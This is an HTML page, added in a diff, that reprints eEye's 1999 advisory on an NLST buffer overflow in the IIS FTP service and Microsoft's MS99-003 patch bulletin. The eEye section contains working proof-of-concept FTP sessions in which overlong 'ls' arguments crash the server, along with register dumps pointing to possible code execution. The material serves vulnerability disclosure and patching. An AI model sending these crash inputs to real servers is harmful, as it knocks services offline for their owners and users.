@@ -1,0 +1,283 @@
+<html><head>
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+<title>IIS FTP Exploit</title>
+<meta name="GENERATOR" content="Microsoft FrontPage 3.0">
+</head><body>
+
+<p><font size="3">________________________________________________________________________<br>
+eEye Digital Security Team &lt;e&gt;<br>
+<a href="http://www.eeye.com/">www.eEye.com</a><br>
+<font color="#0000ff"><u><a href="mailto:info@eEye.com">info@eEye.com</a><br>
+</u></font>Sunday, January 24, 1999<br>
+________________________________________________________________________<br>
+Advisory:<br>
+IIS Remote FTP Exploit/DoS Attack<br>
+Systems Tested:<br>
+Windows NT 4.0 (SP4) IIS 3.0 / 4.0<br>
+Windows 95/98 PWS 1.0<br>
+Release Date:<br>
+Sunday, January 24, 1999<br>
+Advisory Code:<br>
+IISE01<br>
+________________________________________________________________________<br>
+Description:<br>
+________________________________________________________________________<br>
+While feeding in logic into Retina's artificial intelligence engine, which helps construct
+query strings to pass to internet servers, checking for overflow bugs and miss parsing of
+command strings. Our test server stopped responding. Below is our findings. Microsoft IIS
+(Internet Information Server) FTP service contains a buffer overflow in the NLST command.
+This could be used to DoS a remote machine and in some cases execute code remotely. </font></p>
+<font size="3">
+
+</font><p><font size="3">Lets look at the following example attack. [Comments are in brackets.] The server must
+either have anonymous access rights or an attacker must have an account.</font></p>
+<font size="3">
+
+<p>C:\&gt;ftp guilt.xyz.com<br>
+Connected to guilt.xyz.com.<br>
+220 GUILT Microsoft FTP Service (Version 4.0).<br>
+User (marc.xyz.com:(none)): ftp<br>
+331 Anonymous access allowed, send identity (e-mail name) as password.<br>
+Password:<br>
+230 Anonymous user logged in.<br>
+ftp&gt; ls AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+200 PORT command successful.<br>
+150 Opening ASCII mode data connection for file list.<br>
+[The server has now processed our long NLST request and has crashed]<br>
+-&gt; ftp: get :Connection reset by peer<br>
+[Our ftp client looses connection... that is a given]</p>
+</font>
+
+<p><font size="3">The above example uses 316 characters to overflow. This is the smallest
+possible buffer to pass that will overflow IIS. Lets take a look at the server side
+happenings. On the server side we have an "Application Error" message for
+inetinfo.exe. "The instruction at '0x710f8aa2' referenced memory at '0x41414156'. The
+memory could not be 'read'."</font></p>
+<font size="3">
+
+</font><p><font size="3">If we take a look at our registers we will see the following:<br>
+EAX = 0000005C EBX = 00000001<br>
+ECX = 00D3F978 EDX = 002582DD<br>
+ESI = 00D3F978 EDI = 00000000<br>
+EIP = 710F8AA2 ESP = 00D3F644<br>
+EBP = 00D3F9F0 EFL = 00000206</font></p>
+
+<p><font size="3">There is no 41 hex (Our overflow character) in any of our registers so we chalk this up
+as a DoS attack for now. Lets move on and take a look at the largest string we can pass to
+overflow IIS.</font></p>
+<font size="3">
+
+</font><p><font size="3">C:\&gt;ftp guilt.xyz.com<br>
+Connected to guilt.xyz.com.<br>
+220 GUILT Microsoft FTP Service (Version 4.0).<br>
+User (marc.xyz.com:(none)): ftp<br>
+331 Anonymous access allowed, send identity (e-mail name) as password.<br>
+Password:<br>
+230 Anonymous user logged in.<br>
+[The server must either have anonymous access rights or an attacker must have an account]<br>
+ftp&gt; ls AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<br>
+AAAAAAAAA<br>
+200 PORT command successful.<br>
+150 Opening ASCII mode data connection for file list.<br>
+Connection closed by remote host.</font></p>
+
+<p><font size="3">In this case we passed 505 characters to overflow IIS. This is the largest possible
+(tested) buffer to pass that will overflow IIS. Lets take a look once again at the server
+side. On the server we have the same "Application Error" message for
+inetinfo.exe except this time "The instruction at '0x722c9262' referenced memory at
+"0x41414141'." This is looking mighty interesting.</font></p>
+<font size="3">
+
+</font><p><font size="3">Lets look at our registers once again:<br>
+EAX = 00000000 EBX = 41414141<br>
+ECX = 41414141 EDX = 722C1CAC<br>
+ESI = 41414141 EDI = 41414141<br>
+EIP = 722C9262 ESP = 00D3F524<br>
+EBP = 00D3F63C EFL = 00000246</font></p>
+
+<p><font size="3">There sure are a lot of 41 hex codes in our registers now. &gt;:-]</font></p>
+
+<p><font size="3">So to wrap it all up what we have here is a DoS attack against any IIS server with ftp
+access. Keep in mind we have to be able to login. However, Anonymous access is granted on
+most servers. Once we have overflowed IIS all IIS services will fail. (I.E. The web
+service, NNTP, SMTP etc..) What we have seems to be a very interesting buffer overflow.<br>
+________________________________________________________________________<br>
+Special Thanks<br>
+________________________________________________________________________<br>
+The eEye Digital Security Team would like to extend a special thanks to Mudge and Dildog.<br>
+________________________________________________________________________<br>
+Copyright (c) 1999 eEye Digital Security Team<br>
+________________________________________________________________________<br>
+Permission is hereby granted for the redistribution of this alert electronically. It is
+not to be edited in any way without express consent of eEye. If you wish to reprint the
+whole or any part of this alert in any other medium excluding electronic medium, please
+e-mail <font color="#0000ff"><u>alert@eEye.com</u></font> for permission.<br>
+________________________________________________________________________<br>
+Disclaimer:<br>
+________________________________________________________________________<br>
+The information within this paper may change without notice. Use of this information
+constitutes acceptance for use in an AS IS condition. There are NO warranties with regard
+to this information. In no event shall the author be liable for any damages whatsoever
+arising out of or in connection with the use or spread of this information. Any use of
+this information is at the user's own risk. Please send suggestions, updates, and comments
+to: <font color="#0000ff"><u>alert@eEye.com</u></font></font></p>
+<font size="3">
+
+</font><p><font size="3">eEye Digital Security Team<br>
+</font><u><font color="#0000ff" size="3"><a href="http://www.eeye.com/">http://www.eEye.com</a><br>
+</font><font color="#0000ff" size="3"><a href="mailto:info@eEye.com">info@eEye.com</a><br>
+</font></u><font size="3">________________________________________________________________________</font></p>
+<font size="3">
+
+</font><p><font size="3">The following is a Security Bulletin from the Microsoft Product Security Notification
+Service.<br>
+Please do not reply to this message, as it was sent from an unattended mailbox.</font></p>
+
+<p><font size="3">********************************</font></p>
+
+<p><font size="3">Microsoft Security Bulletin (MS99-003)<br>
+--------------------------------------<br>
+Patch Available for IIS "Malformed FTP List Request" Vulnerability Originally
+Posted: February 3, 1999 Summary <br>
+=======<br>
+Microsoft has released a patch that eliminates a vulnerability in the Internet Information
+Server (r) FTP service. This vulnerability could allow denial of service attacks against
+the server or, under certain conditions, could allow arbitrary code to be executed on the
+server. A fully supported fix for this problem is available. As detailed below in What
+Customers Should Do, Microsoft recommends that customers who are at risk from this
+vulnerability apply the patch.</font></p>
+<font size="3">
+
+</font><p><font size="3">Issue<br>
+=====<br>
+The FTP service in IIS has an unchecked buffer in a component that processes
+"list" commands. This results in a vulnerability that poses two threats to safe
+operation. The first is a denial of service threat; a malformed "list" request
+could overflow the buffer causing the server to crash. The second is more esoteric and
+would be far more difficult to exploit. A carefully-constructed "list" request
+could cause arbitrary code to execute on the server via a classic buffer overrun
+technique. Neither variant could be exploited accidentally. </font></p>
+<font size="3">
+
+</font><p><font size="3">It is noteworthy that the "list" command is only available to users after
+they have authenticated to the server. As a result, only users who are authorized to use
+the server would be able to mount such an attack, and their presence on the server could
+be logged if the owner of the site chose to do so. However, many sites provide guest
+accounts, and this could allow a malicious user to attack the server anonymously.</font></p>
+<font size="3">
+
+</font><p><font size="3">Microsoft has no reports of any customers being affected by this vulnerability.
+However, Microsoft is proactively releasing a patch that corrects the problem.</font></p>
+<font size="3">
+
+</font><p><font size="3">Affected Software Versions<br>
+==========================<br>
+The following software versions are affected: - Microsoft Internet Information Server 3.0
+and 4.0</font></p>
+<font size="3">
+
+</font><p><font size="3">What Microsoft is Doing<br>
+=======================<br>
+On February 3rd, Microsoft released a patch that fixes the problem identified above. This
+patch is available for download from the sites listed below. Microsoft has sent this
+security bulletin to customers subscribing to the Microsoft Product Security Notification
+Service (see <font color="#0000ff"><u>http://www.microsoft.com/security/services/bulletin.asp</u></font>
+for more information about this free customer service). Microsoft has published the
+following Knowledge Base (KB) article on this issue:</font></p>
+<font size="3">
+
+<p>- Microsoft Knowledge Base (KB) article Q188348,</p>
+
+<p>Specially-Malformed FTP Requests Can Create Denial of Service</p>
+</font>
+
+<p><font color="#0000ff" size="3"><u>http://support.microsoft.com/support/kb/articles/q188/3/48.asp</u></font></p>
+<font size="3">
+
+</font><p><font size="3">(Note: It might take 24 hours from the original posting of this bulletin for the KB
+article to be visible in the Web-based Knowledge Base.)</font></p>
+<font size="3">
+
+</font><p><font size="3">Microsoft has posted hot fixes to address this problem. Please note that all of these
+patches are designed to be applied atop Windows NT (r) 4.0 SP4.</font></p>
+<font size="3">
+
+</font><p><font size="3">The URLs below have been word-wrapped for readability.</font></p>
+
+<p><font size="3">- Fix for X86 version of IIS 3.0:<br>
+<font color="#0000ff"><a href="ftp://ftp.microsoft.com/bussys/iis/iis-public/fixes/usa/security/ftpls-fix/ftpls3i.exe"><u>ftp://ftp.microsoft.com/bussys/iis/iis-public/fixes/usa/security/ftpls-fix/ftpls3i.exe</u></a></font></font></p>
+
+<p><font size="3">- Fix for Alpha version of IIS 3.0:<br>
+<a href="ftp://ftp.microsoft.com/bussys/iis/iis-public/fixes/usa/security/ftpls-fix/ftpls3a.exe"><font color="#0000ff"><u>ftp://ftp.microsoft.com/bussys/iis/iis-public/</u></font>fixes/usa/security/ftpls-fix/ftpls3a.exe</a></font></p>
+
+<p><font size="3">- Fix for X86 version of IIS 4.0:<br>
+<a href="ftp://ftp.microsoft.com/bussys/iis/iis-public/fixes/usa/security/ftpls-fix/ftpls4i.exe"><font color="#0000ff"><u>ftp://ftp.microsoft.com/bussys/iis/iis-public/</u></font>fixes/usa/security/ftpls-fix/ftpls4i.exe</a></font></p>
+
+<p><font size="3">- Fix for Alpha version of IIS 4.0:<br>
+<a href="ftp://ftp.microsoft.com/bussys/iis/iis-public/fixes/usa/security/ftpls-fix/ftpls4a.exe"><font color="#0000ff"><u>ftp://ftp.microsoft.com/bussys/iis/iis-public/</u></font>fixes/usa/security/ftpls-fix/ftpls4a.exe</a></font></p>
+
+<p><font size="3">What customers should do<br>
+========================<br>
+Microsoft highly recommends that all affected customers download the patch to protect
+their computers. The complete URL for each affected software version is provided above in
+What Microsoft is Doing.</font></p>
+<font size="3">
+
+</font><p><font size="3">More Information<br>
+================<br>
+Please see the following references for more information related to this issue.</font></p>
+<font size="3">
+
+</font><p><font size="3">- Microsoft Security Bulletin MS99-003, Patch Available for IIS "Malformed FTP
+List Request" Vulnerability (the Web-posted version of this bulletin), <font color="#0000ff"><u>http://www.microsoft.com/security/bulletins/ms99-003.asp</u></font>.</font></p>
+<font size="3">
+
+</font><p><font size="3">- Microsoft Knowledge Base (KB) article Q188348, Specially-Malformed FTP Requests Can
+Create Denial of Service, </font><font color="#0000ff" size="3"><u><a href="http://support.microsoft.com/support/kb/articles/q188/3/48.asp">http://support.microsoft.com/support/kb/articles/q188/3/48.asp</a>
+</u></font><font size="3">(Note: It might take 24 hours from the original posting of this
+bulletin for the KB article to be visible in the Web-based Knowledge Base.)</font></p>
+<font size="3">
+
+</font><p><font size="3">Acknowledgements<br>
+================<br>
+Microsoft wishes to acknowledge the eEye Digital Security Team for discovering this
+vulnerability. Obtaining Support on this Issue<br>
+===============================</font></p>
+<font size="3">
+
+</font><p><font size="3">This is a supported patch. If you have problems installing this patch or require
+technical assistance with this patch, please contact Microsoft&nbsp; Technical Support.
+For information on contacting Microsoft Technical Support, please see </font><font color="#0000ff" size="3"><a href="http://support.microsoft.com/support/contact/default.asp"><u>http://support.microsoft.com/support/contact/default.asp</u></a></font><font size="3">. </font></p>
+<font size="3">
+
+</font><p><font size="3">Revisions<br>
+=========<br>
+- February 3, 1999: Bulletin Created</font></p>
+
+<p><font size="3">For additional security-related information about Microsoft products, please visit <font color="#0000ff"><u>http://www.microsoft.com/security</u></font><br>
+-------------------------------------------------------------------------------- <br>
+THE INFORMATION PROVIDED IN THE MICROSOFT KNOWLEDGE BASE IS PROVIDED "AS IS"
+WITHOUT WARRANTY OF ANY KIND. MICROSOFT DISCLAIMS ALL WARRANTIES, EITHER EXPRESS OR
+IMPLIED, INCLUDING THE WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.
+IN NO EVENT SHALL MICROSOFT CORPORATION OR ITS SUPPLIERS BE LIABLE FOR ANY DAMAGES
+WHATSOEVER INCLUDING DIRECT, INDIRECT, INCIDENTAL, CONSEQUENTIAL, LOSS OF BUSINESS PROFITS
+OR SPECIAL DAMAGES, EVEN IF MICROSOFT CORPORATION OR ITS SUPPLIERS HAVE BEEN ADVISED OF
+THE POSSIBILITY OF SUCH DAMAGES. SOME STATES DO NOT ALLOW THE EXCLUSION OR LIMITATION OF
+LIABILITY FOR CONSEQUENTIAL OR INCIDENTAL DAMAGES SO THE FOREGOING LIMITATION MAY NOT
+APPLY. (c) 1999 Microsoft Corporation. All rights reserved. Terms of Use.</font></p>
+<font size="3">
+
+</font><p><font size="3">*******************************************************************</font></p>
+</body></html>
